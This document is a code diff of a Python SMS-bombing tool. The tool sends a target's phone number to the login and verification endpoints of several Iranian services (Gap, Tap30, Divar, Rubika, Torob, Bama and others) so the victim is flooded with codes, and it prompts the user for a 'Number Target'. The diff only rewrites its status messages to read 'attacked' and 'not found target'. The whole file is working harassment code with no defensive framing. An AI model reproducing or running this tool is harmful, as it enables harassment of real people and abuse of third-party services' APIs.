@@ -68,11 +68,11 @@ def gap(phone):
     try:
         gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
         if "OK" in gapR.text:
-            print ("mmd ryson :))")
+            print ("attacked-*")
         else:
-            print (" No Attack :(")
+            print ("not found target-!")
     except:
-        print ("No Attack  :(")
+        print ("no attack-!")
 
 def tap30(phone):
     #tap30 api
@@ -81,11 +81,11 @@ def tap30(phone):
     try:
         tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
         if "OK" in tap30R.text:
-            print ("mmd ryson :))")
+            print ("!-attacked-!\n")
         else:
-            print ("No Attack :(")
+            print ("not found target-!\n")
     except:
-            print ("No Attack :(")
+            print ("no attack-!\n")
 
 def emtiaz(phone):
     #emtiaz api
@@ -93,9 +93,9 @@ def emtiaz(phone):
     emD = "send=1&cellphone=0"+phone.split("+98")[1]
     try:
         emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD)
-        print ("mmd ryson :))")
+        print ("!-attacked-!\n")
     except:
-        print ("No Attack  :(")
+        print ("no attack-!\n")
 
 def divar(phone):
     #divar api
@@ -104,11 +104,11 @@ def divar(phone):
     try:
         divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
         if "SENT" in divarR.text:
-            print ("mmd ryson :)) ")
+            print ("!-attacked-!\n")
         else:
-            print ("No Attack  :(")
+            print ("not found target-!")
     except:
-        print ("No Attack  :(")
+        print ("no attack-!")
 
 def rubika(phone):
     #rubika api
@@ -117,11 +117,11 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
         if "OK" in ruR.text:
-            print ("mmd ryson :)) ")
+            print ("!-attacked-!\n")
         else:
-            print ("No Attack :(")
+            print ("not found target-!")
     except:
-        print ("No Attack  :(")
+        print ("no attack-!")
 
 def torob(phone):
     #torob api
@@ -129,11 +129,11 @@ def torob(phone):
     try:
         torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
         if "sent" in torobR.text:
-            print (" mmd ryson :)) ")
+            print ("!-attacked-!\n")
         else:
-            print (" No Attack :(")
+            print ("not found target-!")
     except:
-        print (" No Attack :(")
+        print ("no attack-!")
 
 def bama(phone):
     #bama api
@@ -142,11 +142,11 @@ def bama(phone):
     try:
         bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
         if "0" in bamaR.text:
-            print ("mmd ryson :)) ")
+            print ("!-attacked-!\n")
         else:
-            print ("No Attack  :(")
+            print ("not found target-!")
     except:
-        print (" No Attack :(")
+        print ("no attack-!")
 
 try:
     phone = str(input(" Number Target (+98xxxxxxx)> "))
